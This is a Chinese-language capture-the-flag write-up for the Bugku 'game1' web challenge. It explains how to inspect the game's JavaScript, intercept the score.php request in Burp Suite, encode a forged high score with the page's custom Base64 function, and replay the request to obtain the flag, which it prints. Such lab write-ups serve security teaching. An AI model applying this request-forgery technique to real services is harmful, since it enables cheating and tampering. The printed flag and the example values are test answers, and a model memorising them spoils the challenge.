# Bugku game1 WriteUp

## 题目信息

- 题目类型：Web

- 题目描述：启动网页如下，哎嘿~是个游戏页面

- 核心思路：抓包分析请求参数，利用自定义Base64编码构造高分数请求，获取flag

---

## 解题步骤

### 1. 查看网页源码，定位关键逻辑

1. 访问题目地址 `http://171.80.2.169:18144`，右键查看网页源代码。

2. 找到引入的 `base.js` 文件，确认这是页面自定义的Base64编码实现。

3. 定位到发送分数的核心JS代码：

    ```JavaScript
    
    var ppp = '106.120.205.138';
    var sign = Base64.encode(score.toString());
    xmlhttp.open("GET", "score.php?score="+score+"&ip="+ppp+"&sign="+sign, true);
    xmlhttp.send();
    ```

    这里明确了：

    - `score`：游戏结束时的分数

    - `ip`：固定值 `106.120.205.138`

    - `sign`：`score` 字符串经过页面自定义Base64编码后的结果

---

### 2. 抓包分析原始请求

1. 开启Burp Suite代理，或使用浏览器开发者工具的“网络”面板。

2. 玩一局游戏并故意输掉，触发 `score.php` 的请求。

3. 观察原始请求示例：

    ```Plain Text
    
    GET /score.php?score=250&ip=106.120.205.138&sign=zMMTjU== HTTP/1.1
    Host: 171.80.2.169:18144
    ```

    此时服务器响应为“失败了”。

---

### 3. 构造高分数与对应sign

1. 在浏览器控制台中，调用页面的自定义Base64编码函数，对高分数（如 `1000000`）进行编码：

    ```JavaScript
    
    Base64.encode("1000000")
    ```

    得到对应的sign值（示例：`zMMTkwMDAwMA==`，实际值以编码结果为准）。

---

### 4. Burp Suite重放请求获取flag

1. 在Burp Suite的Repeater模块中，构造新的GET请求：

    ```Plain Text
    
    GET /score.php?score=1000000&ip=106.120.205.138&sign=zMMTkwMDAwMA== HTTP/1.1
    Host: 171.80.2.169:18144
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
    Accept: */*
    Referer: http://171.80.2.169:18144/
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Connection: keep-alive
    ```

2. 发送请求，服务器响应中会直接返回flag：

    ```Plain Text
    
    flag{bdd2076f6c4f8dc707b82def71acde575}
    ```

---
> （注：文档部分内容可能由 AI 生成）